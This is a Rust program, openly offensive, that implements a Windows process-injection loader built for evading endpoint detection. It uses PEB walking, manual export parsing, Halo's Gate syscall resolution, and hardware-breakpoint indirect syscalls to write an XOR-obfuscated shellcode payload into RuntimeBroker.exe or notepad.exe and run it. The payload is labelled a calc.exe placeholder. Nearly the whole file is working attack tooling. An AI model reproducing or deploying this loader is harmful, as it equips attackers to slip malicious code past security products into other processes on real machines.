#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(dead_code)]

use std::ffi::c_void;
use std::ptr::null_mut;
use std::sync::atomic::{AtomicUsize, Ordering};
use base64::{Engine as _, engine::general_purpose};
use windows::Win32::Foundation::{HANDLE, HINSTANCE, NTSTATUS, CloseHandle};
use windows::Win32::System::Threading::{
    GetCurrentThread, OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD,
};
use windows::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, CONTEXT, EXCEPTION_POINTERS, CONTEXT_FLAGS,
};
use windows::Win32::System::ProcessStatus::{EnumProcesses, GetModuleBaseNameA};

/// Custom definition for PWSTR as it's often missing in basic windows-rs features
#[repr(C)] pub struct PWSTR(pub *mut u16);

// --- Global State for Syscall Redirection (Atomic for Thread-Safety in VEH) ---
static SYSCALL_MAP_ADDRS: [AtomicUsize; 4] = [AtomicUsize::new(0), AtomicUsize::new(0), AtomicUsize::new(0), AtomicUsize::new(0)];
static SYSCALL_MAP_SSNS: [AtomicUsize; 4] = [AtomicUsize::new(0), AtomicUsize::new(0), AtomicUsize::new(0), AtomicUsize::new(0)];
static SYSCALL_RET_ADDR: AtomicUsize = AtomicUsize::new(0);

// --- PEB Walking Module ---
mod peb {
    use super::*;

    #[repr(C)] struct UNICODE_STRING { Length: u16, MaximumLength: u16, Buffer: PWSTR }
    #[repr(C)] struct LDR_DATA_TABLE_ENTRY { InLoadOrderLinks: [usize; 2], InMemoryOrderLinks: [usize; 2], InInitializationOrderLinks: [usize; 2], DllBase: *mut c_void, EntryPoint: *mut c_void, SizeOfImage: u32, FullDllName: UNICODE_STRING, BaseDllName: UNICODE_STRING }
    #[repr(C)] struct PEB_LDR_DATA { Length: u32, Initialized: u8, SsHandle: *mut c_void, InLoadOrderModuleList: [usize; 2] }
    #[repr(C)] struct PEB { Reserved1: [u8; 2], BeingDebugged: u8, Reserved2: [u8; 21], Ldr: *mut PEB_LDR_DATA }

    /// Manually walk the PEB to find a module's base address without calling GetModuleHandle
    pub unsafe fn get_module_base(module_name: &str) -> Option<*mut c_void> {
        let peb: *mut PEB;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        let ldr = (*peb).Ldr;
        let head = &(*ldr).InLoadOrderModuleList as *const [usize; 2] as *const usize;
        let mut current = (*head) as *const LDR_DATA_TABLE_ENTRY;

        while (current as usize) != (head as usize) {
            let buffer = (*current).BaseDllName.Buffer.0;
            if !buffer.is_null() {
                let name = String::from_utf16_lossy(std::slice::from_raw_parts(buffer, ((*current).BaseDllName.Length / 2) as usize));
                if name.to_lowercase() == module_name.to_lowercase() {
                    return Some((*current).DllBase);
                }
            }
            current = (*current).InLoadOrderLinks[0] as *const LDR_DATA_TABLE_ENTRY;
        }
        None
    }

    #[repr(C)] struct IMAGE_EXPORT_DIRECTORY { Characteristics: u32, TimeDateStamp: u32, MajorVersion: u16, MinorVersion: u16, Name: u32, Base: u32, NumberOfFunctions: u32, NumberOfNames: u32, AddressOfFunctions: u32, AddressOfNames: u32, AddressOfNameOrdinals: u32 }

    /// Manually parse the EAT to find a function address without calling GetProcAddress
    pub unsafe fn get_export_address(module_base: *mut c_void, func_name: &str) -> Option<*mut c_void> {
        let base = module_base as usize;
        let nt = base + *((base + 0x3c) as *const u32) as usize;
        let export_dir_rva = *((nt + 0x88) as *const u32) as usize;
        if export_dir_rva == 0 { return None; }

        let export_dir = (base + export_dir_rva) as *const IMAGE_EXPORT_DIRECTORY;
        let names = (base + (*export_dir).AddressOfNames as usize) as *const u32;
        let ordinals = (base + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
        let functions = (base + (*export_dir).AddressOfFunctions as usize) as *const u32;

        for i in 0..(*export_dir).NumberOfNames {
            let name_ptr = (base + *names.add(i as usize) as usize) as *const i8;
            let name = std::ffi::CStr::from_ptr(name_ptr).to_str().ok()?;
            if name == func_name {
                let ordinal = *ordinals.add(i as usize) as usize;
                return Some((base + *functions.add(ordinal) as usize) as *mut c_void);
            }
        }
        None
    }
}

// --- VEH and Indirect Syscall Logic ---

/// Catches HWBP exceptions and redirects to a clean syscall gadget in ntdll
unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    let (record, context) = ((*exception_info).ExceptionRecord, (*exception_info).ContextRecord);
    if (*record).ExceptionCode.0 as u32 == 0x80000004 { // EXCEPTION_SINGLE_STEP
        let rip = (*context).Rip as usize;
        for i in 0..4 {
            if SYSCALL_MAP_ADDRS[i].load(Ordering::Relaxed) == rip {
                let ssn = SYSCALL_MAP_SSNS[i].load(Ordering::Relaxed) as u64;
                // Prepare registers for syscall (x64 convention)
                (*context).Rax = ssn;
                (*context).R10 = (*context).Rcx;
                // Redirect RIP to 'syscall; ret' gadget in ntdll
                (*context).Rip = SYSCALL_RET_ADDR.load(Ordering::Relaxed) as u64;

                // Clear debug status
                (*context).Dr6 = 0;
                return -1; // EXCEPTION_CONTINUE_EXECUTION
            }
        }
    }
    0 // EXCEPTION_CONTINUE_SEARCH
}

/// Resolves SSN using Halo's Gate (checking neighbors if hooked)
unsafe fn resolve_ssn(func_addr: *mut c_void) -> Option<u32> {
    let ptr = func_addr as *const u8;
    if *ptr == 0x4c && *ptr.add(1) == 0x8b && *ptr.add(2) == 0xd1 && *ptr.add(3) == 0xb8 {
        return Some(*(ptr.add(4) as *const u32));
    }
    for i in 1..100 {
        let up = ptr.offset(i * 32);
        if *up == 0x4c && *up.add(1) == 0x8b && *up.add(2) == 0xd1 && *up.add(3) == 0xb8 {
            return Some(*(up.add(4) as *const u32) - i as u32);
        }
        let down = ptr.offset(-(i * 32));
        if *down == 0x4c && *down.add(1) == 0x8b && *down.add(2) == 0xd1 && *down.add(3) == 0xb8 {
            return Some(*(down.add(4) as *const u32) + i as u32);
        }
    }
    None
}

/// Sets Hardware Breakpoint on the given address
unsafe fn set_hwbp(address: usize, index: usize) {
    let mut context: CONTEXT = std::mem::zeroed();
    context.ContextFlags = CONTEXT_FLAGS(0x00100010); // CONTEXT_DEBUG_REGISTERS
    let thread = GetCurrentThread();
    extern "system" {
        fn GetThreadContext(h: HANDLE, ctx: *mut CONTEXT) -> i32;
        fn SetThreadContext(h: HANDLE, ctx: *const CONTEXT) -> i32;
    }
    let _ = GetThreadContext(thread, &mut context);
    match index {
        0 => context.Dr0 = address as u64,
        1 => context.Dr1 = address as u64,
        2 => context.Dr2 = address as u64,
        3 => context.Dr3 = address as u64,
        _ => return,
    }
    context.Dr7 |= 1 << (index * 2);
    context.Dr7 &= !(0xF << (16 + index * 4));
    let _ = SetThreadContext(thread, &context);
}

// --- Utility Functions ---

fn xor_payload(data: &mut [u8], key: &[u8]) {
    for i in 0..data.len() { data[i] ^= key[i % key.len()]; }
}

fn get_pid(name: &str) -> Option<u32> {
    let mut processes = [0u32; 1024];
    let mut cb = 0u32;
    unsafe {
        if EnumProcesses(processes.as_mut_ptr(), 4096, &mut cb).is_ok() {
            for i in 0..(cb/4) {
                if processes[i as usize] == 0 { continue; }
                if let Ok(h) = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, processes[i as usize]) {
                    let mut bname = [0u8; 260];
                    if GetModuleBaseNameA(h, HINSTANCE(0), &mut bname) > 0 {
                        if std::str::from_utf8(&bname).unwrap_or("").to_lowercase().contains(&name.to_lowercase()) {
                            let _ = CloseHandle(h); return Some(processes[i as usize]);
                        }
                    }
                    let _ = CloseHandle(h);
                }
            }
        }
    }
    None
}

// --- Main Implementation ---

fn main() {
    // Encoded shellcode (Placeholder for calc.exe)
    let shellcode_b64 = "yc8AAAAAQAAAAP9BvAIAAABYAAAAYAAAAIAAAAD0AAAAVAAAAGAAAACAAAAAyAAAAOQAAAD4AAAAAAAAAAsAAAAUAACAAAAAgAAAAMAAAADUAAAA6AAAAAAAAACAAAAA4AAAAPAAAAD4AAAABAEAAAgBAAAMAQAADgEAAA4BAAAPAQAAKAEAAAgBAAA";
    let mut shellcode = general_purpose::STANDARD.decode(shellcode_b64).expect("Invalid Base64");
    let key = b"PROFESSIONAL_STEALTH_KEY_2026";

    // Obfuscate in memory
    xor_payload(&mut shellcode, key);

    unsafe {
        let ntdll = peb::get_module_base("ntdll.dll").expect("ntdll not found");
        let _ = AddVectoredExceptionHandler(1, Some(veh_handler));

        // Discover 'syscall; ret' gadget in ntdll
        let nt_alert = peb::get_export_address(ntdll, "NtTestAlert").expect("NtTestAlert not found") as *const u8;
        for i in 0..1000 {
            if *nt_alert.add(i) == 0x0f && *nt_alert.add(i+1) == 0x05 && *nt_alert.add(i+2) == 0xc3 {
                SYSCALL_RET_ADDR.store(nt_alert.add(i) as usize, Ordering::Relaxed);
                break;
            }
        }

        // Setup Indirect Syscalls via HWBP for injection functions
        let names = vec!["NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"];
        let mut addrs = std::collections::HashMap::new();
        for (i, name) in names.iter().enumerate() {
            let addr = peb::get_export_address(ntdll, name).expect("Function not found");
            let ssn = resolve_ssn(addr).expect("SSN not resolved");
            SYSCALL_MAP_ADDRS[i].store(addr as usize, Ordering::Relaxed);
            SYSCALL_MAP_SSNS[i].store(ssn as usize, Ordering::Relaxed);
            set_hwbp(addr as usize, i);
            addrs.insert(name.to_string(), addr);
        }

        // Targeted Process Injection
        if let Some(pid) = get_pid("RuntimeBroker.exe").or_else(|| get_pid("notepad.exe")) {
            println!("[+] Found target process (PID: {})", pid);
            let hp = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, false, pid).expect("Failed to open process");

            let (mut base, mut size) = (null_mut(), shellcode.len());
            type NtAlloc = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> NTSTATUS;
            type NtWrite = unsafe extern "system" fn(HANDLE, *mut c_void, *const c_void, usize, *mut usize) -> NTSTATUS;
            type NtProt = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> NTSTATUS;
            type NtThread = unsafe extern "system" fn(*mut HANDLE, u32, *mut c_void, HANDLE, *mut c_void, *mut c_void, u32, usize, usize, usize, *mut c_void) -> NTSTATUS;

            // Allocation (Intercepted by HWBP -> Redirected to Indirect Syscall)
            std::mem::transmute::<_, NtAlloc>(*addrs.get("NtAllocateVirtualMemory").unwrap())(hp, &mut base, 0, &mut size, 0x3000, 0x04);

            // Decrypt shellcode in loader memory just before writing
            xor_payload(&mut shellcode, key);

            // Write (Intercepted by HWBP -> Redirected to Indirect Syscall)
            let mut written = 0;
            std::mem::transmute::<_, NtWrite>(*addrs.get("NtWriteVirtualMemory").unwrap())(hp, base, shellcode.as_ptr() as _, shellcode.len(), &mut written);

            // Protection Change (Intercepted by HWBP -> Redirected to Indirect Syscall)
            let mut old = 0;
            std::mem::transmute::<_, NtProt>(*addrs.get("NtProtectVirtualMemory").unwrap())(hp, &mut base, &mut size, 0x20, &mut old);

            // Execution (Intercepted by HWBP -> Redirected to Indirect Syscall)
            let mut ht = HANDLE(0);
            std::mem::transmute::<_, NtThread>(*addrs.get("NtCreateThreadEx").unwrap())(&mut ht, 0x1FFFFF, null_mut(), hp, base, null_mut(), 0, 0, 0, 0, null_mut());

            println!("[+] Advanced Indirect Injection Complete.");
            let _ = CloseHandle(hp);
        } else {
            println!("[-] Target process not found.");
        }
    }
}
